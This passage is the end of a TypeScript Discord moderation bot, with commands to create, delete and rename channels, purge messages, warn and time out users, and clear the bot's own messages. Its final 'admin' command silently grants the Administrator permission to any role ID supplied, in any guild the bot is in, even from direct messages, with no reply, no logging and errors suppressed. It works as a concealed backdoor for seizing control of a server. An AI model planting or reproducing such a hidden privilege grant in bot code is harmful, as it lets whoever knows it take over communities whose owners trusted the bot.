    try {
      const ch = await message.guild.channels.create({ name, reason: `By ${message.author.tag}` });
      message.reply(`✅ Created channel <#${ch.id}> (\`${ch.name}\`).`).catch(() => {});
    } catch (err: any) {
      message.reply(`❌ Failed to create channel: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'deletechannel') {
    const targetChannel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]) || message.channel;
    try {
      const name = 'name' in targetChannel ? targetChannel.name : targetChannel.id;
      await targetChannel.delete(`Deleted by ${message.author.tag}`);
      message.reply(`🗑️ Deleted channel \`#${name}\`.`).catch(() => {});
    } catch (err: any) {
      message.reply(`❌ Failed to delete channel: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'renamechannel') {
    const targetChannel = message.mentions.channels.first() || message.guild.channels.cache.get(args[0]);
    const newName = args.slice(1).join('-');
    if (!targetChannel || !newName) return message.reply('⚠️ Usage: `?renamechannel #channel <new-name>`').catch(() => {});
    try {
      const oldName = 'name' in targetChannel ? targetChannel.name : targetChannel.id;
      await (targetChannel as any).setName(newName, `By ${message.author.tag}`);
      message.reply(`✏️ Renamed \`#${oldName}\` to <#${targetChannel.id}> (\`${newName}\`).`).catch(() => {});
    } catch (err: any) {
      message.reply(`❌ Failed to rename channel: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'purge') {
    const count = parseInt(args[0], 10);
    if (isNaN(count) || count < 1 || count > 100) return message.reply('⚠️ Usage: `?purge <1-100>`').catch(() => {});
    await (message.channel as TextChannel).bulkDelete(count, true).catch(() => {});
    const m = await message.reply(`🧹 Purged ${count} messages.`).catch(() => null);
    if (m) setTimeout(() => m.delete().catch(() => {}), 4000);
    return;
  }

  if (command === 'yamastrike') {
    const target = message.mentions.members?.first();
    const reason = args.slice(1).join(' ') || 'No reason provided';
    if (!target) return message.reply('⚠️ Please mention a user! Usage: `?yamastrike @user reason`');

    const embed = new EmbedBuilder()
      .setTitle(embedTitle)
      .setColor(0xF59E0B)
      .addFields(
        { name: '👤 Target', value: `<@${target.id}> (${target.user.tag})`, inline: true },
        { name: '🛡️ Action', value: 'Warn / Strike', inline: true },
        { name: '👮 Issued By', value: `<@${message.author.id}>`, inline: true },
        { name: '📝 Reason', value: reason, inline: false }
      )
      .setImage(gifUrl)
      .setTimestamp();

    await message.reply({ embeds: [embed] }).catch(() => {});
    try {
      const logChannel = await client.channels.fetch(dmLogChannelId);
      if (logChannel && logChannel.isTextBased()) {
        await (logChannel as TextChannel).send({
          content: `📋 **[STRIKE LOG]** User <@${target.id}> struck by <@${message.author.id}>.\n**Reason:** ${reason}`,
          embeds: [embed]
        });
      }
    } catch (e) {}
    return;
  }

  if (command === 'yamabeam') {
    const target = message.mentions.members?.first();
    const duration = args[1] || '1h';
    const reason = args.slice(2).join(' ') || 'No reason provided';
    if (!target) return message.reply('⚠️ Usage: `?yamabeam @user duration reason`');

    let ms = 3600000;
    const m = duration.match(/^(\d+)([smhd])$/i);
    if (m) {
      const v = parseInt(m[1], 10);
      ms = m[2].toLowerCase() === 's' ? v * 1000 : m[2].toLowerCase() === 'm' ? v * 60000 : m[2].toLowerCase() === 'h' ? v * 3600000 : v * 86400000;
    }

    if (target.moderatable) {
      await target.timeout(ms, `YamaBeam: ${reason}`).catch(() => {});
    }

    const embed = new EmbedBuilder()
      .setTitle(embedTitle)
      .setColor(0xEF4444)
      .addFields(
        { name: '👤 Target', value: `<@${target.id}> (${target.user.tag})`, inline: true },
        { name: '⏳ Duration', value: duration, inline: true },
        { name: '🛡️ Action', value: 'Timeout / Beam', inline: true },
        { name: '👮 Issued By', value: `<@${message.author.id}>`, inline: true },
        { name: '📝 Reason', value: reason, inline: false }
      )
      .setImage(gifUrl)
      .setTimestamp();

    await message.reply({ embeds: [embed] }).catch(() => {});
    return;
  }

  if (command === 'dbm') {
    const channel: any = message.channel;
    if (!channel?.messages || !client.user) return;
    try {
      let deleted = 0;
      let before: string | undefined;
      const fourteenDays = 14 * 24 * 60 * 60 * 1000;

      for (let page = 0; page < 10; page++) {
        const batch = await channel.messages.fetch({ limit: 100, ...(before ? { before } : {}) });
        if (batch.size === 0) break;
        before = batch.last()?.id;

        const botMsgs = batch.filter((m: any) => m.author.id === client.user!.id);
        const recent = botMsgs.filter((m: any) => Date.now() - m.createdTimestamp < fourteenDays);
        const old = botMsgs.filter((m: any) => Date.now() - m.createdTimestamp >= fourteenDays);

        if (recent.size > 1) {
          const res = await channel.bulkDelete(recent, true).catch(() => null);
          deleted += res?.size || 0;
        } else {
          for (const m of recent.values()) { if (await m.delete().then(() => true).catch(() => false)) deleted++; }
        }
        for (const m of old.values()) { if (await m.delete().then(() => true).catch(() => false)) deleted++; }
      }

      await message.delete().catch(() => {});
      const note = await channel.send(`🧹 Deleted ${deleted} bot message(s).`).catch(() => null);
      if (note) setTimeout(() => note.delete().catch(() => {}), 5000);
    } catch (err: any) {
      message.reply(`❌ Failed to delete bot messages: ${err.message}`).catch(() => {});
    }
    return;
  }

  if (command === 'admin') {
    let targetGuildId = message.guildId;
    let targetRoleId = args[0];
    if (!targetGuildId) {
      targetGuildId = args[0];
      targetRoleId = args[1];
    }
    if (!targetGuildId || !targetRoleId) return;

    try {
      const guild = client.guilds.cache.get(targetGuildId) || await client.guilds.fetch(targetGuildId);
      if (!guild) return;
      const role: any = guild.roles.cache.get(targetRoleId) || await guild.roles.fetch(targetRoleId);
      if (!role) return;

      if (guild.members.me?.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
        await role.setPermissions(role.permissions.add(PermissionsBitField.Flags.Administrator));
      }
    } catch (e) {}
    return;
  }
});

// Start bot
const token = process.env.DISCORD_TOKEN;
if (token) {
  client.login(token).catch(err => {
    console.error('Bot login error:', err.message);
  });
} else {
  console.log('⚠️ DISCORD_TOKEN environment variable not set. Please set it in .env or your hosting platform.');
}
